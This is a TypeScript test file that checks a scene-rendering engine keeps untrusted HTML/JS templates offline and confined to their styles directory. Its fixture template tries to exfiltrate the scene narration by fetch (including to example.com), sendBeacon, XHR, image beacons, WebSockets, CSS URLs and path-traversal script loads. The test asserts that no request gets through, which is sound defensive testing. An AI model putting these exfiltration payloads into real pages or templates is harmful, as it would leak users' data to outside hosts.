// Templates are untrusted JS that can read window.__scene (the narration). The engine must render them offline:
// a style that tries every exfiltration path reaches no server and cannot load files outside stylesDir.
import assert from "node:assert/strict";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { pathToFileURL } from "node:url";
import type { ScenePlan } from "../../packages/contract/src/index.ts";
import { renderPreviews, TemplateError } from "../engine/render.ts";

test("templates render offline: no network, no files outside stylesDir", { timeout: 120_000 }, async () => {
	const hits: string[] = [];
	const server = createServer((req, res) => {
		hits.push(`${req.method} ${req.url}`);
		res.end("ok");
	});
	server.on("upgrade", (req, sock) => {
		hits.push(`UPGRADE ${req.url}`);
		sock.destroy();
	});
	await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
	const port = (server.address() as AddressInfo).port;
	const root = await mkdtemp(join(tmpdir(), "vf-offline-"));
	try {
		// Outside stylesDir: a script that would leak and break the render if it ever loaded.
		await mkdir(join(root, "outside"));
		const outsideJs = join(root, "outside", "leak.js");
		await writeFile(outsideJs, `fetch("http://127.0.0.1:${port}/outside"); throw new Error("OUTSIDE FILE LOADED");`);
		const styles = join(root, "styles");
		await mkdir(join(styles, "evil"), { recursive: true });
		await writeFile(join(styles, "evil", "tokens.json"), JSON.stringify({ palette: { bg: "#123456" } }));
		await writeFile(join(styles, "evil", "inside.js"), "window.__insideLoaded = true;");
		const T = (p: string) => `http://127.0.0.1:${port}/${p}`;
		await writeFile(
			join(styles, "evil", "leak.html"),
			`<!doctype html><html><head>
<link rel="stylesheet" href="${T("css")}">
<link rel="prefetch" href="${T("prefetch")}">
<style>body{background:url("${T("cssurl")}")} @font-face{font-family:x;src:url("${T("font")}")} p{font-family:x}</style>
<script src="inside.js"></script>
<script src="../../outside/leak.js"></script>
<script src="${pathToFileURL(outsideJs).href}"></script>
</head><body><p>hi</p>
<img src="${T("img")}"><iframe src="${T("iframe")}"></iframe>
<script>
const d = encodeURIComponent(JSON.stringify(window.__scene));
const swallow = (f) => { try { const r = f(); if (r && r.catch) r.catch(() => {}); } catch {} };
swallow(() => fetch("https://example.com/x?d=" + d));
swallow(() => fetch("${T("fetch")}?d=" + d, { mode: "no-cors" }));
swallow(() => navigator.sendBeacon("${T("beacon")}", d));
swallow(() => { const x = new XMLHttpRequest(); x.onerror = () => {}; x.open("GET", "${T("xhr")}?d=" + d); x.send(); });
swallow(() => { new Image().src = "${T("image")}?d=" + d; });
swallow(() => { const w = new WebSocket("ws://127.0.0.1:${port}/ws?d=" + d); w.onerror = () => {}; });
swallow(() => new EventSource("${T("sse")}"));
swallow(() => navigator.serviceWorker && navigator.serviceWorker.register("inside.js"));
swallow(() => fetch("../../outside/leak.js"));
window.__ready = new Promise((r) => {
  if (!window.__insideLoaded) throw new Error("inside-stylesDir script did not load");
  r();
});
window.__seek = (t) => { document.body.style.color = t > 1 ? "#fff" : "#eee"; };
</script></body></html>`,
		);
		const plan: ScenePlan = {
			style: "evil", fps: 30, resolution: "640x360",
			scenes: [{ n: 1, template: "leak", props: {}, duration_s: 2, narration: "secret narration", transition: "cut" }],
		};
		const inp = { plan, stylesDir: styles, workDir: join(root, "work"), audioPath: null, audioSeconds: 2 };
		// Blocked loads surface as console errors, which the engine treats as template errors: a template that
		// depends on the network fails cleanly with a TemplateError instead of leaking. Either way: zero requests.
		let err: unknown = null;
		try {
			const frames = await renderPreviews(inp);
			assert.equal(frames.size, 3);
		} catch (e) {
			err = e;
		}
		await new Promise((r) => setTimeout(r, 500)); // let any stray request land
		assert.deepEqual(hits, [], `server received requests: ${hits.join(", ")}`);
		if (err) {
			assert.ok(err instanceof TemplateError, `expected TemplateError, got ${err}`);
			assert.doesNotMatch(err.logTail, /OUTSIDE FILE LOADED|did not load/);
		}

		// A well-behaved template (only stylesDir files) still renders.
		await writeFile(
			join(styles, "evil", "clean.html"),
			`<!doctype html><html><body><script src="inside.js"></script><script>
if (!window.__insideLoaded) throw new Error("inside-stylesDir script did not load");
window.__seek = (t) => { document.body.style.color = t > 1 ? "#fff" : "#eee"; };
</script></body></html>`,
		);
		plan.scenes[0].template = "clean";
		assert.equal((await renderPreviews(inp)).size, 3);
	} finally {
		server.close();
		await rm(root, { recursive: true, force: true });
	}
});
